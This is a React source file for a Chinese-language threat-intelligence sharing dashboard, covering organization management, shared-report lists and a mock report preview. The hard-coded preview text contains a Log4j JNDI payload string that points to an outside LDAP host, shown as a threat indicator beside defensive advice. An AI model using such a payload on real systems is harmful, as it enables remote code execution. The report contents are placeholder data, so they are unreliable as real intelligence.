import React, { useState, useEffect } from 'react';
import { Users, Share2, Plus, Edit2, Trash2, CheckCircle, AlertCircle, X, Save, Loader2, Blocks, Hash, Database, Link2, Server } from 'lucide-react';
import PageHeader from '../components/PageHeader';
import { Organization } from '../types';
import { OrgService } from '../services/connector'; // 引入真实的 Service

const OrgManagement: React.FC = () => {
  // ---------------- State Management ----------------
  const [orgs, setOrgs] = useState<Organization[]>([]);
  const [loading, setLoading] = useState(true); // 加载状态
  const [error, setError] = useState<string | null>(null);

  const [isModalOpen, setIsModalOpen] = useState(false);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false); // 提交中状态
  
  const [formData, setFormData] = useState({
    name: '',
    maxMembers: 10,
    adminPermission: false
  });

  // 共享列表状态
  const [shares, setShares] = useState([
    { id: 1, title: '【AI生成】2025-12-15 异常流量行为深度分析简报', source: '网络防御组 Beta', time: '2 小时前', status: 'pending' },
    { id: 2, title: '【SecGPT】针对金融区内网的 APT 渗透溯源报告', source: '威胁情报中心', time: '5 小时前', status: 'pending' }
  ]);
  
  const [acceptedShares, setAcceptedShares] = useState<any[]>([
    { id: 201, title: '【存证】跨链威胁情报共享协议v1.0.pdf', source: '联盟链管理节点', time: '3 天前', status: 'accepted' }
  ]);

  const [activeTab, setActiveTab] = useState<'received' | 'initiated' | 'accepted'>('received');

  const [initiatedShares, setInitiatedShares] = useState<any[]>([
      { id: 101, title: '【自动生成】2025年第一季度核心资产安全态势感知报告', target: '总部安全中心', time: '1 天前', status: 'accepted', source: '本组织' },
      { id: 102, title: '【紧急】关于 WannaCry 变种勒索病毒的特征分析与防御建议', target: '各分公司', time: '3 天前', status: 'pending', source: '本组织' }
  ]);

  // Report Preview State
  const [reportModalOpen, setReportModalOpen] = useState(false);
  const [currentReport, setCurrentReport] = useState<any>(null);

  // ---------------- API Calls ----------------

  // 1. 初始化加载数据
  const fetchOrgs = async () => {
    setLoading(true);
    try {
      const data = await OrgService.getAll();
      setOrgs(data);
      setError(null);
    } catch (err) {
      console.error("API Error", err);
      // 优雅降级：如果 API 失败，暂时不显示数据或显示错误，不再回退到 Mock
      setError("无法连接到组织管理服务，请检查后端状态。");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchOrgs();
  }, []);

  // Load shared reports from localStorage
  useEffect(() => {
      const loadShared = () => {
          const stored = localStorage.getItem('shared_reports');
          if (stored) {
              try {
                  const parsed = JSON.parse(stored);
                  setInitiatedShares(prev => {
                      const newItems = parsed.filter((p: any) => !prev.find(existing => existing.id === p.id));
                      if (newItems.length > 0) {
                           const formatted = newItems.map((p: any) => ({
                               ...p,
                               target: '全网广播',
                               source: '本组织'
                           }));
                           return [...formatted, ...prev];
                      }
                      return prev;
                  });
              } catch (e) { console.error(e); }
          }
      };

      loadShared();
      window.addEventListener('storage', loadShared);
      return () => window.removeEventListener('storage', loadShared);
  }, []);

  // ---------------- Handlers ----------------

  const handleOpenModal = (org?: Organization) => {
    if (org) {
      setEditingId(org.id);
      setFormData({
        name: org.name,
        maxMembers: org.maxMembers,
        adminPermission: org.adminPermission
      });
    } else {
      setEditingId(null);
      setFormData({
        name: '',
        maxMembers: 10,
        adminPermission: false
      });
    }
    setIsModalOpen(true);
  };

  const handleDelete = async (id: string) => {
    if (window.confirm('确定要解散该组织吗？此操作将同步至云端数据库。')) {
      try {
        await OrgService.delete(id);
      } catch (err) {
        console.error("Backend delete failed, using frontend fallback", err);
      }
      // Optimistic update: always remove from UI
      setOrgs(prev => prev.filter(org => org.id !== id));
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitting(true);
    
    try {
      if (editingId) {
        // API: Update
        const updatedOrg = await OrgService.update(editingId, {
            name: formData.name,
            maxMembers: formData.maxMembers,
            adminPermission: formData.adminPermission
        });
        setOrgs(prev => prev.map(org => org.id === editingId ? updatedOrg : org));
      } else {
        // API: Create
        const newOrg = await OrgService.create({
            name: formData.name,
            maxMembers: formData.maxMembers,
            adminPermission: formData.adminPermission,
            memberCount: 1 // 初始值
        });
        setOrgs(prev => [...prev, newOrg]);
      }
      setIsModalOpen(false);
    } catch (err) {
      alert("操作失败：" + (err as any).message);
    } finally {
      setSubmitting(false);
    }
  };

  const handleShareAction = (id: number, action: 'accept' | 'reject') => {
    setShares(prev => prev.filter(s => s.id !== id));
  };

  const handleViewReport = (report: any) => {
    setCurrentReport(report);
    setReportModalOpen(true);
  };

  // ---------------- Render ----------------

  return (
    <div className="space-y-6 animate-fade-in relative">
      
      {/* ---------------- 页面标题 ---------------- */}
      <PageHeader title="存证共享平台" subtitle="基于区块链技术的威胁情报不可篡改存证与共享网络">
        <button 
          onClick={() => handleOpenModal()}
          className="flex items-center gap-2 bg-gradient-to-r from-cyber-accent to-blue-600 text-white px-5 py-2.5 rounded-lg font-bold hover:shadow-lg hover:shadow-cyber-accent/20 transition-all transform hover:-translate-y-0.5 active:scale-95"
        >
          <Plus size={18} /> 新增节点
        </button>
      </PageHeader>

      {/* ---------------- 统计卡片 ---------------- */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-5">
        <div className="relative rounded-2xl p-5 overflow-hidden" style={{background: 'linear-gradient(145deg, rgba(0,20,40,0.95) 0%, rgba(0,40,60,0.9) 100%)'}}>
          <div className="absolute inset-0 rounded-2xl border border-cyan-500/30"></div>
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-cyan-500/20 rounded-full blur-2xl"></div>
          <div className="relative z-10 flex items-center gap-3">
            <Users size={24} className="text-cyan-400" />
            <div>
              <p className="text-4xl font-mono font-bold text-white">{orgs.length}</p>
              <p className="text-sm text-slate-400 uppercase">组织总数</p>
            </div>
          </div>
        </div>
        <div className="relative rounded-2xl p-5 overflow-hidden" style={{background: 'linear-gradient(145deg, rgba(0,30,20,0.95) 0%, rgba(0,50,30,0.9) 100%)'}}>
          <div className="absolute inset-0 rounded-2xl border border-emerald-500/30"></div>
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-emerald-500/20 rounded-full blur-2xl"></div>
          <div className="relative z-10 flex items-center gap-3">
            <CheckCircle size={24} className="text-emerald-400" />
            <div>
              <p className="text-4xl font-mono font-bold text-emerald-400">{orgs.reduce((sum, o) => sum + o.memberCount, 0)}</p>
              <p className="text-sm text-slate-400 uppercase">总成员数</p>
            </div>
          </div>
        </div>
        <div className="relative rounded-2xl p-5 overflow-hidden" style={{background: 'linear-gradient(145deg, rgba(20,0,40,0.95) 0%, rgba(40,0,60,0.9) 100%)'}}>
          <div className="absolute inset-0 rounded-2xl border border-purple-500/30"></div>
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-purple-500/20 rounded-full blur-2xl"></div>
          <div className="relative z-10 flex items-center gap-3">
            <Share2 size={24} className="text-purple-400" />
            <div>
              <p className="text-4xl font-mono font-bold text-purple-400">{shares.length}</p>
              <p className="text-sm text-slate-400 uppercase">待处理共享</p>
            </div>
          </div>
        </div>
        <div className="relative rounded-2xl p-5 overflow-hidden" style={{background: 'linear-gradient(145deg, rgba(30,20,0,0.95) 0%, rgba(50,30,0,0.9) 100%)'}}>
          <div className="absolute inset-0 rounded-2xl border border-amber-500/30"></div>
          <div className="absolute -right-4 -top-4 w-20 h-20 bg-amber-500/20 rounded-full blur-2xl"></div>
          <div className="relative z-10 flex items-center gap-3">
            <AlertCircle size={24} className="text-amber-400" />
            <div>
              <p className="text-4xl font-mono font-bold text-amber-400">{orgs.filter(o => o.adminPermission).length}</p>
              <p className="text-sm text-slate-400 uppercase">管理员组织</p>
            </div>
          </div>
        </div>
      </div>

      {/* ---------------- 组织列表区域 ---------------- */}
      <section>
        {loading ? (
           <div className="p-20 flex flex-col items-center justify-center text-cyber-accent">
               <Loader2 size={48} className="animate-spin mb-4" />
               <p>正在同步云端数据...</p>
           </div>
        ) : error ? (
           <div className="p-12 border border-red-500/30 bg-red-500/10 rounded-xl flex flex-col items-center justify-center text-red-400">
             <AlertCircle size={48} className="mb-4" />
             <p>{error}</p>
             <button onClick={fetchOrgs} className="mt-4 px-4 py-2 bg-red-500/20 rounded hover:bg-red-500/30">重试</button>
           </div>
        ) : orgs.length === 0 ? (
          <div className="p-12 border-2 border-dashed border-cyber-700 rounded-xl flex flex-col items-center justify-center text-slate-500 bg-cyber-900/30">
            <AlertCircle size={48} className="mb-4 opacity-50" />
            <p>暂无组织信息，请创建新的组织。</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            {orgs.map(org => (
              <div key={org.id} className="group bg-cyber-900/60 backdrop-blur-sm border border-cyber-700 rounded-xl p-5 hover:border-cyber-accent transition-all duration-300 hover:shadow-[0_0_20px_rgba(6,182,212,0.1)] relative overflow-hidden">
                <div className="absolute top-0 right-0 w-32 h-32 bg-cyber-accent/5 rounded-full blur-2xl -mr-16 -mt-16 transition-opacity opacity-0 group-hover:opacity-100"></div>

                <div className="flex justify-between items-start mb-3 relative z-10">
                  <div>
                    <h3 className="text-lg font-bold text-white group-hover:text-cyber-accent transition-colors truncate max-w-[120px]" title={org.name}>{org.name}</h3>
                    <div className="flex items-center gap-2 mt-1">
                       <p className="text-[10px] text-slate-500 cursor-help font-mono">
                         {new Date(org.createdAt).toISOString().split('T')[0]}
                       </p>
                       {org.adminPermission && (
                         <span className="text-[10px] bg-cyber-accent/10 text-cyber-accent px-1.5 py-0.5 rounded border border-cyber-accent/20 font-mono">NODE</span>
                       )}
                    </div>
                  </div>
                  
                  <div className="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                    <button 
                      onClick={() => handleOpenModal(org)}
                      className="p-1.5 text-slate-400 hover:text-white bg-cyber-800 hover:bg-cyber-700 rounded-lg border border-cyber-700 transition-colors"
                      title="编辑"
                    >
                      <Edit2 size={14} />
                    </button>
                    <button 
                      onClick={() => handleDelete(org.id)}
                      className="p-1.5 text-red-400 hover:text-red-300 bg-cyber-800 hover:bg-red-900/30 rounded-lg border border-cyber-700 hover:border-red-500/30 transition-colors"
                      title="解散"
                    >
                      <Trash2 size={14} />
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </section>

      {/* ---------------- 共享列表 (保持原样) ---------------- */}
      <section className="border-t border-cyber-800 pt-8">
        <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-2">
          <Share2 className="text-cyber-accent" /> 威胁情报共享中心
        </h2>
        
        <div className="bg-cyber-900/40 border border-cyber-700 rounded-xl overflow-hidden backdrop-blur-sm">
           <div className="p-4 border-b border-cyber-700 flex gap-6 bg-cyber-900/50">
             <button 
               onClick={() => setActiveTab('received')}
               className={`text-sm font-bold pb-4 -mb-4.5 transition-colors ${activeTab === 'received' ? 'text-white border-b-2 border-cyber-accent' : 'text-slate-500 hover:text-slate-300'}`}
             >
               待接收 ({shares.length})
             </button>
             <button 
               onClick={() => setActiveTab('accepted')}
               className={`text-sm font-bold pb-4 -mb-4.5 transition-colors ${activeTab === 'accepted' ? 'text-white border-b-2 border-cyber-accent' : 'text-slate-500 hover:text-slate-300'}`}
             >
               已接收 ({acceptedShares.length})
             </button>
             <button 
               onClick={() => setActiveTab('initiated')}
               className={`text-sm font-bold pb-4 -mb-4.5 transition-colors ${activeTab === 'initiated' ? 'text-white border-b-2 border-cyber-accent' : 'text-slate-500 hover:text-slate-300'}`}
             >
               我发起的 ({initiatedShares.length})
             </button>
           </div>
           
           <div className="divide-y divide-cyber-700/50">
             {(activeTab === 'received' ? shares : activeTab === 'accepted' ? acceptedShares : initiatedShares).length === 0 ? (
                <div className="p-12 flex flex-col items-center justify-center text-slate-500 gap-2">
                   <CheckCircle size={32} className="text-emerald-500/50" />
                   <p className="text-sm">暂无{activeTab === 'received' ? '待处理' : activeTab === 'accepted' ? '已接收' : '已发起'}的共享记录</p>
                </div>
             ) : (
               (activeTab === 'received' ? shares : activeTab === 'accepted' ? acceptedShares : initiatedShares).map((item) => (
                 <div key={item.id} className="p-4 flex flex-col sm:flex-row items-center justify-between hover:bg-cyber-800/30 transition-colors gap-4 animate-slide-up">
                   <div className="flex items-center gap-4 w-full sm:w-auto">
                     <div className="w-10 h-10 bg-purple-500/10 border border-purple-500/20 rounded-full flex items-center justify-center text-purple-400 font-bold shrink-0">
                       {item.source.charAt(0)}
                     </div>
                     <div>
                       <h4 className="font-bold text-white text-sm">{item.title}</h4>
                       <p className="text-xs text-slate-400 flex items-center gap-2 mt-0.5">
                         <span>{activeTab === 'initiated' ? '发送给: ' + (item as any).target : '来自: ' + item.source}</span>
                         <span className="w-1 h-1 bg-slate-600 rounded-full"></span>
                         <span>{item.time}</span>
                       </p>
                     </div>
                   </div>
                   <div className="flex gap-2 w-full sm:w-auto justify-end">
                     {activeTab === 'received' ? (
                       <>
                         <button 
                            onClick={() => handleShareAction(item.id, 'reject')}
                            className="px-3 py-1.5 text-xs text-slate-400 hover:text-white border border-cyber-700 hover:bg-cyber-700 rounded-lg transition-colors"
                         >
                           忽略
                         </button>
                         <button 
                            onClick={() => {
                                handleShareAction(item.id, 'accept');
                                handleViewReport(item);
                            }}
                            className="px-3 py-1.5 text-xs bg-cyber-accent/10 text-cyber-accent border border-cyber-accent/20 hover:bg-cyber-accent/20 rounded-lg font-bold flex items-center gap-1 transition-colors"
                         >
                           <CheckCircle size={14} /> 接收并查看
                         </button>
                       </>
                     ) : (
                       <button 
                          onClick={() => handleViewReport(item)}
                          className="px-3 py-1.5 text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 hover:bg-blue-500/20 rounded-lg font-bold flex items-center gap-1 transition-colors"
                       >
                         <Share2 size={14} /> 查看详情
                       </button>
                     )}
                   </div>
                 </div>
               ))
             )}
           </div>
        </div>
      </section>

      {/* ---------------- 弹窗模态框 ---------------- */}
      {isModalOpen && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-cyber-950/80 backdrop-blur-sm" onClick={() => !submitting && setIsModalOpen(false)}></div>
          <div className="relative bg-cyber-900 border border-cyber-700 rounded-xl w-full max-w-md shadow-2xl animate-fade-in overflow-hidden">
            <div className="px-6 py-4 border-b border-cyber-800 flex justify-between items-center bg-gradient-to-r from-cyber-800 to-cyber-900">
              <h3 className="text-lg font-bold text-white">{editingId ? '编辑组织信息' : '创建新组织'}</h3>
              <button onClick={() => setIsModalOpen(false)} disabled={submitting} className="text-slate-400 hover:text-white transition-colors disabled:opacity-50">
                <X size={20} />
              </button>
            </div>

            <form onSubmit={handleSubmit} className="p-6 space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-400 uppercase mb-2">组织名称</label>
                <input 
                  type="text" 
                  required
                  value={formData.name}
                  onChange={e => setFormData({...formData, name: e.target.value})}
                  className="w-full bg-cyber-950 border border-cyber-700 rounded-lg p-3 text-white focus:border-cyber-accent focus:ring-1 focus:ring-cyber-accent outline-none transition-all placeholder-slate-600"
                  disabled={submitting}
                  autoFocus
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-400 uppercase mb-2">最大成员限制</label>
                <div className="relative">
                  <input 
                    type="number" 
                    min="1"
                    max="200"
                    value={formData.maxMembers}
                    onChange={e => setFormData({...formData, maxMembers: parseInt(e.target.value)})}
                    className="w-full bg-cyber-950 border border-cyber-700 rounded-lg p-3 text-white focus:border-cyber-accent focus:ring-1 focus:ring-cyber-accent outline-none transition-all"
                    disabled={submitting}
                  />
                  <span className="absolute right-4 top-3 text-slate-500 text-sm">人</span>
                </div>
              </div>

              <div className="flex items-center gap-3 p-3 bg-cyber-950/50 rounded-lg border border-cyber-800 cursor-pointer" onClick={() => !submitting && setFormData({...formData, adminPermission: !formData.adminPermission})}>
                <div className={`w-4 h-4 rounded border flex items-center justify-center transition-colors ${formData.adminPermission ? 'bg-cyber-accent border-cyber-accent' : 'border-cyber-700 bg-cyber-900'}`}>
                   {formData.adminPermission && <CheckCircle size={12} className="text-cyber-900" />}
                </div>
                <label className="text-sm text-slate-300 select-none cursor-pointer">
                  授予超级管理员权限 (ROOT)
                </label>
              </div>

              <div className="pt-4 flex gap-3">
                <button 
                  type="button" 
                  onClick={() => setIsModalOpen(false)}
                  disabled={submitting}
                  className="flex-1 py-2.5 bg-cyber-800 hover:bg-cyber-700 text-slate-300 rounded-lg font-medium transition-colors disabled:opacity-50"
                >
                  取消
                </button>
                <button 
                  type="submit" 
                  disabled={submitting}
                  className="flex-1 py-2.5 bg-gradient-to-r from-cyber-accent to-blue-600 hover:shadow-lg hover:shadow-cyber-accent/20 text-white rounded-lg font-bold flex justify-center items-center gap-2 transition-all active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed"
                >
                  {submitting ? <Loader2 size={18} className="animate-spin" /> : <Save size={18} />}
                  {submitting ? '提交中...' : (editingId ? '保存变更' : '立即创建')}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ---------------- 报告预览模态框 ---------------- */}
      {reportModalOpen && currentReport && (
        <div className="fixed inset-0 z-[70] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/90 backdrop-blur-md" onClick={() => setReportModalOpen(false)}></div>
          <div className="relative bg-cyber-900 border border-cyber-700 rounded-2xl w-full max-w-4xl h-[80vh] shadow-2xl animate-fade-in overflow-hidden flex flex-col">
            {/* Header */}
            <div className="px-6 py-4 border-b border-cyber-700 flex justify-between items-center bg-gradient-to-r from-cyber-900 to-cyber-800">
              <div className="flex items-center gap-3">
                <div className="p-2 bg-blue-500/20 rounded-lg text-blue-400">
                  <Share2 size={20} />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white line-clamp-1">{currentReport.title}</h3>
                  <p className="text-xs text-slate-400 flex items-center gap-2">
                    <span>来源: {currentReport.source}</span>
                    <span className="w-1 h-1 bg-slate-600 rounded-full"></span>
                    <span>{currentReport.time}</span>
                  </p>
                </div>
              </div>
              <button onClick={() => setReportModalOpen(false)} className="p-2 hover:bg-white/10 rounded-lg transition-colors text-slate-400 hover:text-white">
                <X size={24} />
              </button>
            </div>

            {/* Content */}
            <div className="flex-1 overflow-y-auto p-8 custom-scrollbar bg-cyber-950">
              <div className="max-w-3xl mx-auto space-y-8">
                <div className="text-center border-b border-cyber-800 pb-8">
                  <h1 className="text-3xl font-bold text-white mb-4">{currentReport.title}</h1>
                  <div className="flex justify-center gap-4 text-sm text-slate-400">
                    <span className="px-3 py-1 rounded-full bg-cyber-800 border border-cyber-700">绝密 ★★★</span>
                    <span className="px-3 py-1 rounded-full bg-cyber-800 border border-cyber-700">TLP:RED</span>
                  </div>
                </div>

                <div className="prose prose-invert prose-lg max-w-none">
                  <h3 className="text-cyber-accent">1. 摘要 (Executive Summary)</h3>
                  <p className="text-slate-300 leading-relaxed">
                    本报告基于御链天鉴安全平台（SecGPT）的实时流量分析引擎生成。在过去 24 小时内，系统监测到针对核心资产的持续性异常访问请求。经过关联分析，确认这是一起有组织、有预谋的 APT 渗透尝试。
                  </p>
                  
                  <h3 className="text-cyber-accent">2. 威胁特征 (Threat Indicators)</h3>
                  <ul className="list-disc pl-5 text-slate-300 space-y-2">
                    <li><strong className="text-white">攻击源 IP:</strong> 45.33.22.11 (已知恶意僵尸网络节点)</li>
                    <li><strong className="text-white">攻击手法:</strong> SQL 注入结合 Log4j 漏洞利用</li>
                    <li><strong className="text-white">Payload 特征:</strong> <code>${`{jndi:ldap://45.33.22.11/exploit}`}</code></li>
                  </ul>

                  <h3 className="text-cyber-accent">3. 处置建议 (Recommendations)</h3>
                  <div className="bg-emerald-900/20 border border-emerald-500/30 rounded-xl p-4">
                    <ul className="list-decimal pl-5 text-emerald-100 space-y-2">
                      <li>立即封禁攻击源 IP 段：45.33.22.0/24</li>
                      <li>升级 WAF 规则库至版本 v2025.12.19</li>
                      <li>排查内网主机是否建立异常反向连接</li>
                    </ul>
                  </div>
                </div>

                <div className="pt-8 border-t border-cyber-800 text-center text-slate-600 text-xs font-mono">
                  Report ID: {currentReport.id} | Generated by YuLianTianJian SecGPT | {new Date().getFullYear()}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default OrgManagement;